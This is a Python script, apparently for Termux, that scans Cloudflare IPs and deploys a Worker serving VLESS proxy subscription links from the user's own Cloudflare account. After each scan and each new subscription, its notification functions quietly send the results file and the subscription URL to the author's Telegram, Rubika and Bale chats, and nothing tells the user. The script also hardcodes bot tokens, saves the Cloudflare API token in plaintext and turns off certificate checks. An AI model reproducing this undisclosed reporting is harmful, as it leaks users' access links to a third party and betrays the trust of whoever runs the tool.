#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ipaddress
import os
import re
import socket
import ssl
import sys
import time
import json
import uuid
import csv
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    END = "\033[0m"

# ==================== Paths & Settings ====================
GITHUB_IP_URL = "https://raw.githubusercontent.com/amir1388hev-glitch/termux_ip/main/Termux_ips"
DOWNLOAD_DIR = "/sdcard/Download"
LOCAL_ALL_IPS_FILE = os.path.join(DOWNLOAD_DIR, "all_ips.txt")
TEST_RESULT_FILE = os.path.join(DOWNLOAD_DIR, "تست_سلامت_ایپی.txt")
HTML_REPORT_FILE = os.path.join(DOWNLOAD_DIR, "scan_report.html")
CSV_REPORT_FILE = os.path.join(DOWNLOAD_DIR, "scan_report.csv")
CONFIG_FILE = os.path.expanduser("~/.cf_credentials.json")

# ==================== Bot Settings ====================
RUBIKA_BOT_TOKEN = "CABGDG0AGFFRWJKSBWBUBRUGGFMYNFITBVVDKTSVBNOKZWANYOITFQILZSSLCRKT"
RUBIKA_CHAT_ID = "g0ILUMK0562851bf38dfcd7703bdeb22"
TELEGRAM_BOT_TOKEN = "8851868234:AAFHxnxQ8AnHubsHtx0fNYtZ4mdGdUyXIoI"
TELEGRAM_CHAT_ID = "-1004437972136"
BALE_BOT_TOKEN = "2690620:Nm1F_42X7P1ZMCg8VMMsQaMKDgDOEbSIvUk"
BALE_CHAT_ID = "5495275998"

TELEGRAM_ID = "@Pod66Mp"
RUBIKA_ID = "@Amir5880Om"

SCAN_SETTINGS = {
    "domain": "chatgpt.com",
    "path": "/",
    "port": 443,
    "timeout": 3.0,
    "workers": 30,
    "test_download": True,
    "download_size_mb": 1.0,
    "max_ips_limit": 5000
}

TLS_PORTS = [443, 8443, 2053, 2083, 2087, 2096]
NON_TLS_PORTS = [80, 8080, 8880, 2052, 2082, 2086, 2095]

LAST_CLEAN_IPS = []
stop_scan = False

WORKER_JS_CODE = """
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const pathParts = url.pathname.split('/').filter(Boolean);

    if (pathParts[0] === 'sub' && pathParts[1]) {
      const username = pathParts[1];

      try {
        const { results: userResults } = await env.DB.prepare(
          "SELECT * FROM users WHERE username = ?"
        ).bind(username).all();

        if (!userResults || userResults.length === 0) {
          return new Response("User not found", { status: 404 });
        }
        const user = userResults[0];

        const { results: ipResults } = await env.DB.prepare(
          "SELECT ip_port FROM clean_ips ORDER BY latency ASC"
        ).all();

        let cleanIPs = [];
        if (ipResults && ipResults.length > 0) {
          cleanIPs = ipResults.map(r => r.ip_port);
        } else {
          cleanIPs = ["104.16.51.89:443", "104.17.120.12:443", "162.159.138.4:443", "172.67.180.22:443"];
        }

        let configs = [];
        const requestedCount = user.config_count || 30;
        
        for (let i = 0; i < requestedCount; i++) {
          const ipPort = cleanIPs[i % cleanIPs.length];
          const [ip, port] = ipPort.split(':');
          const configName = `${user.username}-Node-${i + 1}`;
          const vlessConfig = `vless://${user.user_uuid}@${ip}:${port || 443}?encryption=none&security=tls&type=ws&host=${url.hostname}&path=%2F#${encodeURIComponent(configName)}`;
          configs.push(vlessConfig);
        }

        const rawText = configs.join('\\n');
        const base64Output = btoa(rawText);

        return new Response(base64Output, {
          headers: {
            "content-type": "text/plain; charset=utf-8",
            "Access-Control-Allow-Origin": "*"
          }
        });

      } catch (err) {
        return new Response("Database Error: " + err.message, { status: 500 });
      }
    }

    return new Response("AMIR Config Speed Subscription Server Active.", { status: 200 });
  }
};
"""

# ==================== Messenger Notification System ====================
def send_to_telegram(text, file_path=None):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
        if file_path and os.path.exists(file_path):
            doc_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(file_path, "rb") as f:
                requests.post(doc_url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"document": f}, timeout=10)
    except Exception:
        pass

def send_to_rubika(text, file_path=None):
    try:
        url = f"https://botapi.rubika.ir/bot{RUBIKA_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": RUBIKA_CHAT_ID, "text": text}, timeout=5)
    except Exception:
        pass

def send_to_bale(text, file_path=None):
    try:
        url = f"https://tapi.bale.ai/bot{BALE_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": BALE_CHAT_ID, "text": text}, timeout=5)
    except Exception:
        pass

def send_notifications_all(text, file_path=None):
    send_to_telegram(text, file_path)
    send_to_rubika(text, file_path)
    send_to_bale(text, file_path)

# ==================== Helper & Network Functions ====================
def get_ip_country(ip):
    try:
        res = requests.get(f"https://ipmyp.ir/api/ip/{ip}", timeout=3)
        data = res.json()
        return data.get("country") or data.get("country_name") or "Unknown"
    except Exception:
        try:
            res = requests.get(f"http://ip-api.com/json/{ip}?fields=country", timeout=2)
            return res.json().get("country", "Unknown")
        except Exception:
            return "Unknown"

def get_clean_input(prompt_text):
    try:
        return re.sub(r"\D", "", input(prompt_text))
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)

def parse_ip_input(user_input):
    ips = []
    entries = user_input.replace("\n", ",").replace("\r", ",").split(",")
    for entry in entries:
        entry = entry.strip()
        if not entry:
            continue
        if "/" in entry:
            try:
                net = ipaddress.ip_network(entry, strict=False)
                hosts = list(net.hosts())
                if len(hosts) > SCAN_SETTINGS["max_ips_limit"]:
                    hosts = random.sample(hosts, SCAN_SETTINGS["max_ips_limit"])
                for ip in hosts:
                    ips.append(str(ip))
            except Exception:
                pass
        elif "-" in entry and "." in entry:
            try:
                parts = entry.split("-")
                start = ipaddress.ip_address(parts[0].strip())
                end_ip = parts[1].strip()
                if end_ip.count(".") == 0:
                    end_ip = ".".join(parts[0].strip().split(".")[:3]) + "." + end_ip
                end = ipaddress.ip_address(end_ip)
                curr = start
                count = 0
                while curr <= end and count < SCAN_SETTINGS["max_ips_limit"]:
                    ips.append(str(curr))
                    curr += 1
                    count += 1
            except Exception:
                pass
        else:
            try:
                ipaddress.ip_address(entry)
                ips.append(entry)
            except Exception:
                pass
    return ips

def get_ips_from_github(url):
    try:
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            lines = [l.strip() for l in res.text.splitlines() if l.strip() and not l.startswith("#")]
            return parse_ip_input(",".join(lines))
    except Exception:
        pass
    return []

def get_ips_from_local_file():
    if os.path.exists(LOCAL_ALL_IPS_FILE):
        try:
            with open(LOCAL_ALL_IPS_FILE, "r", encoding="utf-8") as f:
                raw_ips = [l.strip().split()[0].split(":")[0] for l in f if l.strip() and not l.startswith("#")]
                return parse_ip_input(",".join(raw_ips))
        except Exception:
            pass
    return []

def select_ip_source():
    print(Colors.CYAN + "\nSelect IP Source:" + Colors.END)
    print("1. GitHub Repository")
    print("2. Manual Input (Single, CIDR, Range)")
    print("3. Local File (all_ips.txt)")
    choice = get_clean_input(Colors.BOLD + "[>] Select option (1/2/3): " + Colors.END)
    if choice == "1":
        return get_ips_from_github(GITHUB_IP_URL)
    elif choice == "2":
        lines = []
        print(Colors.CYAN + "Enter IPs and press Enter twice when done:" + Colors.END)
        while True:
            l = input().strip()
            if not l:
                break
            lines.append(l)
        return parse_ip_input(",".join(lines))
    elif choice == "3":
        return get_ips_from_local_file()
    return []

# ==================== Scanner Engine & Download Test ====================
def test_real_download_speed(ip, port, domain):
    try:
        start = time.time()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((ip, port))
        
        tls_sock = ctx.wrap_socket(sock, server_hostname=domain)
        req = f"GET /__down?bytes=1048576 HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
        tls_sock.sendall(req.encode())
        
        total_downloaded = 0
        while True:
            data = tls_sock.recv(16384)
            if not data:
                break
            total_downloaded += len(data)
            if total_downloaded >= 1048576:
                break
        
        tls_sock.close()
        elapsed = time.time() - start
        if elapsed > 0 and total_downloaded > 0:
            speed_mbps = (total_downloaded * 8) / (elapsed * 1024 * 1024)
            return round(speed_mbps, 2)
    except Exception:
        pass
    return 0.0

def check_ip_http_latency(ip, port=443, domain="chatgpt.com", timeout=3.0, test_download=True, path="/"):
    for attempt in range(2):
        start_time = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            if port in NON_TLS_PORTS:
                req = f"GET {path} HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                sock.sendall(req.encode())
                res = sock.recv(1024)
                sock.close()
                if not res:
                    continue
            else:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                tls_sock = ctx.wrap_socket(sock, server_hostname=domain)
                req = f"GET {path} HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                tls_sock.sendall(req.encode())
                res = tls_sock.recv(1024)
                tls_sock.close()
                if not res:
                    continue
            
            latency = round((time.time() - start_time) * 1000, 1)
            download_speed = 0.0
            if test_download and port in TLS_PORTS:
                download_speed = test_real_download_speed(ip, port, domain)
            
            return latency, download_speed
        except Exception:
            if attempt == 1:
                return None, 0.0
    return None, 0.0

def export_reports(results, port):
    try:
        with open(TEST_RESULT_FILE, "w", encoding="utf-8") as f:
            for item in results:
                f.write(f"{item[0]}:{port}\n")
    except Exception:
        pass

    try:
        with open(CSV_REPORT_FILE, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["IP", "Port", "Latency (ms)", "Speed (Mbps)", "Country"])
            for item in results:
                writer.writerow([item[0], port, item[1], item[2], item[3]])
    except Exception:
        pass

    try:
        html_content = f"""<html><head><title>AMIR Scan Report</title>
        <style>body{{font-family:sans-serif;background:#1e1e1e;color:#fff;padding:20px;}}
        table{{width:100%;border-collapse:collapse;margin-top:20px;}}
        th,td{{border:1px solid #444;padding:10px;text-align:center;}}
        th{{background:#333;color:#00ffcc;}} tr:nth-child(even){{background:#2a2a2a;}}</style>
        </head><body><h2>Cloudflare IP Scan Results</h2>
        <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <table><tr><th>IP</th><th>Port</th><th>Latency (ms)</th><th>Speed (Mbps)</th><th>Country</th></tr>"""
        for item in results:
            html_content += f"<tr><td>{item[0]}</td><td>{port}</td><td>{item[1]}</td><td>{item[2]}</td><td>{item[3]}</td></tr>"
        html_content += "</table></body></html>"
        with open(HTML_REPORT_FILE, "w", encoding="utf-8") as f:
            f.write(html_content)
    except Exception:
        pass

def run_scanner_engine(ips, port, domain, timeout, test_download, path, workers):
    global stop_scan, LAST_CLEAN_IPS
    stop_scan = False
    working_results = []
    import threading
    thread_lock = threading.Lock()

    print(Colors.BLUE + f"\n[*] Scanning {len(ips)} IPs on port {port}..." + Colors.END)

    def worker_task(ip):
        if stop_scan:
            return
        lat, speed = check_ip_http_latency(ip, port=port, domain=domain, timeout=timeout, test_download=test_download, path=path)
        if lat is not None:
            country = get_ip_country(ip)
            with thread_lock:
                working_results.append((ip, lat, speed, country))
                speed_str = f"{speed} Mbps" if speed > 0 else "N/A"
                print(f"{ip:<18} | {str(lat)+'ms':<8} | {speed_str:<10} | {country:<12} | {Colors.GREEN}[OK]{Colors.END}")

    with ThreadPoolExecutor(max_workers=workers) as executor:
        try:
            futures = [executor.submit(worker_task, ip) for ip in ips]
            for f in as_completed(futures):
                if stop_scan:
                    break
        except KeyboardInterrupt:
            stop_scan = True

    working_results.sort(key=lambda x: x[1])
    LAST_CLEAN_IPS = working_results

    export_reports(working_results, port)

    # پیام ارسال شده به پیام‌رسان‌ها (فارسی)
    if working_results:
        msg = f"🚀 اسکن جدید تکمیل شد\nتعداد آی‌پی سالم: {len(working_results)}\nبهترین تأخیر: {working_results[0][1]}ms"
        send_notifications_all(msg, TEST_RESULT_FILE)

    return working_results, len(ips)

# ==================== Banner & CF Credentials ====================
def print_banner():
    print(f"""{Colors.CYAN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════╗
 ║                        AMIR SCANNER PRO                          ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║  {Colors.YELLOW}► Version        :{Colors.WHITE} v2.8.0 (Full Core Edition){Colors.CYAN}           ║
 ║  {Colors.YELLOW}► Telegram Admin :{Colors.WHITE} {TELEGRAM_ID:<22}{Colors.CYAN}                 ║
 ║  {Colors.YELLOW}► Rubika Admin   :{Colors.WHITE} {RUBIKA_ID:<22}{Colors.CYAN}                 ║
 ╚══════════════════════════════════════════════════════════════════╝{Colors.END}
""")

def get_cf_credentials():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                if data.get("account_id") and data.get("api_token"):
                    use_saved = input(Colors.BOLD + "👉 Use saved Cloudflare credentials? (Y/n): " + Colors.END).strip().lower()
                    if use_saved != 'n':
                        return data["account_id"], data["api_token"]
        except Exception:
            pass

    acc_id = input(Colors.BOLD + "1. Cloudflare Account ID: " + Colors.END).strip()
    token = input(Colors.BOLD + "2. Cloudflare API Token: " + Colors.END).strip()
    if acc_id and token:
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump({"account_id": acc_id, "api_token": token}, f)
        except Exception:
            pass
    return acc_id, token

def deploy_worker_automatically(account_id, api_token, db_id, worker_name="amir-sub"):
    headers = {"Authorization": f"Bearer {api_token}"}
    subdomain_res = requests.get(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/workers/subdomain", headers=headers)
    subdomain = subdomain_res.json().get("result", {}).get("subdomain", "") if subdomain_res.status_code == 200 else ""

    if not subdomain:
        init_sub = requests.put(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/workers/subdomain", headers=headers, json={"subdomain": f"amir-sub-{account_id[:6]}"})
        if init_sub.status_code == 200:
            subdomain = init_sub.json().get("result", {}).get("subdomain", "")

    metadata = {"main_module": "worker.js", "bindings": [{"name": "DB", "type": "d1", "id": db_id}]}
    files = {
        "metadata": ("metadata.json", json.dumps(metadata), "application/json"),
        "worker.js": ("worker.js", WORKER_JS_CODE, "application/javascript+module")
    }

    deploy_res = requests.put(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/workers/scripts/{worker_name}", headers=headers, files=files)
    if deploy_res.status_code == 200:
        requests.post(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/workers/scripts/{worker_name}/subdomain", headers={"Authorization": f"Bearer {api_token}", "Content-Type": "application/json"}, json={"enabled": True})
        return f"https://{worker_name}.{subdomain}.workers.dev"
    return None

def sync_clean_ips_to_d1(account_id, api_token, db_id, clean_results):
    headers = {"Authorization": f"Bearer {api_token}", "Content-Type": "application/json"}
    
    requests.post(
        f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query",
        headers=headers,
        json={"sql": "CREATE TABLE IF NOT EXISTS clean_ips (ip_port TEXT PRIMARY KEY, latency REAL);"}
    )

    requests.post(
        f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query",
        headers=headers,
        json={"sql": "DELETE FROM clean_ips;"}
    )

    for item in clean_results:
        ip_val = item[0] if isinstance(item, (list, tuple)) else str(item)
        lat_val = item[1] if isinstance(item, (list, tuple)) and len(item) > 1 else 100
        ip_port = ip_val if ":" in ip_val else f"{ip_val}:443"
        
        requests.post(
            f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query",
            headers=headers,
            json={"sql": "INSERT OR REPLACE INTO clean_ips VALUES (?, ?);", "params": [ip_port, lat_val]}
        )
    print(Colors.GREEN + f"  [✓] Successfully synced {len(clean_results)} IPs to D1 database." + Colors.END)

def load_clean_ips_from_file():
    clean_ips = []
    if os.path.exists(TEST_RESULT_FILE):
        try:
            with open(TEST_RESULT_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    ip_part = line.split()[0]
                    clean_ips.append(ip_part)
            print(Colors.GREEN + f"  [✓] Loaded {len(clean_ips)} clean IPs from 'تست_سلامت_ایپی.txt'." + Colors.END)
        except Exception as e:
            print(Colors.RED + f"  [!] Error reading file: {e}" + Colors.END)
    else:
        print(Colors.YELLOW + "  [!] File 'تست_سلامت_ایپی.txt' not found in Download directory!" + Colors.END)
    return clean_ips

# ==================== Menus & Handlers ====================
def menu_option_1():
    ips = select_ip_source()
    if not ips: return
    results, total = run_scanner_engine(ips, SCAN_SETTINGS['port'], SCAN_SETTINGS['domain'], SCAN_SETTINGS['timeout'], SCAN_SETTINGS['test_download'], SCAN_SETTINGS['path'], SCAN_SETTINGS['workers'])
    print(Colors.GREEN + f"\n[✓] Scan finished ({len(results)} clean IPs saved)." + Colors.END)

def menu_option_2():
    ips = select_ip_source()
    if not ips: return
    p = input(Colors.BOLD + "Enter TLS Port (e.g. 8443): " + Colors.END).strip()
    port = int(p) if p.isdigit() else 8443
    run_scanner_engine(ips, port, SCAN_SETTINGS['domain'], SCAN_SETTINGS['timeout'], SCAN_SETTINGS['test_download'], SCAN_SETTINGS['path'], SCAN_SETTINGS['workers'])

def menu_option_3():
    ips = select_ip_source()
    if not ips: return
    p = input(Colors.BOLD + "Enter HTTP Port (e.g. 80): " + Colors.END).strip()
    port = int(p) if p.isdigit() else 80
    run_scanner_engine(ips, port, SCAN_SETTINGS['domain'], SCAN_SETTINGS['timeout'], SCAN_SETTINGS['test_download'], SCAN_SETTINGS['path'], SCAN_SETTINGS['workers'])

def menu_option_settings():
    print(Colors.CYAN + "\n--- Advanced Settings ---" + Colors.END)
    d = input(f"Target Domain ({SCAN_SETTINGS['domain']}): ").strip()
    if d: SCAN_SETTINGS['domain'] = d
    w = input(f"Workers / Threads ({SCAN_SETTINGS['workers']}): ").strip()
    if w.isdigit(): SCAN_SETTINGS['workers'] = int(w)
    t = input(f"Timeout ({SCAN_SETTINGS['timeout']}): ").strip()
    try: SCAN_SETTINGS['timeout'] = float(t)
    except Exception: pass
    dl = input(f"Test Download Speed? (y/n) [{SCAN_SETTINGS['test_download']}]: ").strip().lower()
    if dl in ['y', 'n']: SCAN_SETTINGS['test_download'] = (dl == 'y')

def menu_manage_d1_users():
    account_id, api_token = get_cf_credentials()
    if not account_id or not api_token: return
    headers = {"Authorization": f"Bearer {api_token}", "Content-Type": "application/json"}
    
    db_name = "amir-db"
    res = requests.get(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database", headers=headers)
    db_id = None
    if res.status_code == 200:
        for db in res.json().get("result", []):
            if db.get("name") == db_name:
                db_id = db.get("uuid")
                break
    
    if not db_id:
        print(Colors.RED + "❌ D1 Database not found!" + Colors.END)
        return

    print(Colors.CYAN + "\n--- D1 User Management ---" + Colors.END)
    print("1. List Users")
    print("2. Delete User")
    opt = get_clean_input("[>] Select option: ")
    
    if opt == "1":
        query_res = requests.post(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query", headers=headers, json={"sql": "SELECT username, config_count, created_at FROM users;"})
        if query_res.status_code == 200:
            rows = query_res.json()["result"][0]["results"]
            print(Colors.YELLOW + f"\n{'Username':<15} | {'Configs':<10} | {'Created At':<20}" + Colors.END)
            print("-" * 50)
            for r in rows:
                print(f"{r.get('username',''):<15} | {r.get('config_count',0):<10} | {r.get('created_at',''):<20}")
    elif opt == "2":
        u_del = input("Username to delete: ").strip()
        if u_del:
            requests.post(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query", headers=headers, json={"sql": "DELETE FROM users WHERE username = ?;", "params": [u_del]})
            print(Colors.GREEN + f"User '{u_del}' deleted successfully." + Colors.END)

def menu_option_7_subscription_builder():
    global LAST_CLEAN_IPS
    os.system("clear")
    print_banner()

    clean_ips = []
    if LAST_CLEAN_IPS:
        clean_ips = [item[0] if isinstance(item, (list, tuple)) else item for item in LAST_CLEAN_IPS]
    else:
        clean_ips = load_clean_ips_from_file()

    if not clean_ips:
        print(Colors.RED + "\n❌ No clean IPs found!" + Colors.END)
        return

    account_id, api_token = get_cf_credentials()
    if not account_id or not api_token: return

    headers = {"Authorization": f"Bearer {api_token}", "Content-Type": "application/json"}
    db_name = "amir-db"

    res = requests.get(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database", headers=headers)
    db_id = None
    if res.status_code == 200:
        for db in res.json().get("result", []):
            if db.get("name") == db_name:
                db_id = db.get("uuid")
                break

    if not db_id:
        create_res = requests.post(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database", headers=headers, json={"name": db_name})
        if create_res.status_code == 200:
            db_id = create_res.json()["result"]["uuid"]

    print(Colors.BLUE + "\n[*] Syncing IPs with D1 Database..." + Colors.END)
    sync_clean_ips_to_d1(account_id, api_token, db_id, [(ip, 100) for ip in clean_ips])

    worker_url = deploy_worker_automatically(account_id, api_token, db_id)
    if not worker_url:
        print(Colors.RED + "❌ Worker Deployment Failed!" + Colors.END)
        return

    username = input(Colors.BOLD + "\n👤 Enter New Username: " + Colors.END).strip()
    if not username: return

    cfg_count_in = input(Colors.BOLD + "🔢 Config Count (default 30): " + Colors.END).strip()
    config_count = int(cfg_count_in) if cfg_count_in.isdigit() else 30

    user_uuid = str(uuid.uuid4())
    created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    requests.post(
        f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query",
        headers=headers,
        json={"sql": "CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, user_uuid TEXT, protocol TEXT, config_count INTEGER, volume_gb REAL, expire_days INTEGER, max_ips INTEGER, created_at TEXT);"}
    )

    requests.post(
        f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query",
        headers=headers,
        json={"sql": "INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?);", "params": [username, user_uuid, "VLESS", config_count, 0, 0, 2, created_at]}
    )

    worker_sub_url = f"{worker_url}/sub/{username}"
    print(Colors.GREEN + f"\n[✓] Subscription Link Created:\n{worker_sub_url}" + Colors.END)

    # پیام ارسال شده به پیام‌رسان‌ها (فارسی)
    send_notifications_all(f"🚀 ساب‌سکرپشن جدید ساخته شد:\n{worker_sub_url}\nکاربر: {username}")

def main_menu():
    while True:
        print_banner()
        print(f"""{Colors.CYAN}
 ╔══════════════════════════════════════════════════════════════════╗
 ║  {Colors.GREEN}[1] Standard Cloudflare IP Scan (Port 443){Colors.CYAN}              ║
 ║  {Colors.GREEN}[2] Custom TLS Ports Scan (8443, 2053, ...){Colors.CYAN}                 ║
 ║  {Colors.GREEN}[3] Custom Non-TLS Ports Scan (80, 8080, ...){Colors.CYAN}             ║
 ║  {Colors.GREEN}[4] Advanced Settings (Domain, Speed Test, Timeout){Colors.CYAN}    ║
 ║  {Colors.GREEN}[5] Manage D1 Users{Colors.CYAN}                                        ║
 ║  {Colors.GREEN}[7] Build Subscription (Auto Read تست_سلامت_ایپی.txt){Colors.CYAN}     ║
 ║  {Colors.END}{Colors.CYAN}[0] Exit{Colors.CYAN}                                                         ║
 ╚══════════════════════════════════════════════════════════════════╝
""")
        choice = get_clean_input(Colors.BOLD + "[>] Select Option: " + Colors.END)
        if choice == "1": menu_option_1()
        elif choice == "2": menu_option_2()
        elif choice == "3": menu_option_3()
        elif choice == "4": menu_option_settings()
        elif choice == "5": menu_manage_d1_users()
        elif choice == "7": menu_option_7_subscription_builder()
        elif choice == "0": sys.exit(0)
        input(Colors.BOLD + "\n[*] Press Enter to continue..." + Colors.END)
        os.system("clear")

if __name__ == "__main__":
    main_menu()
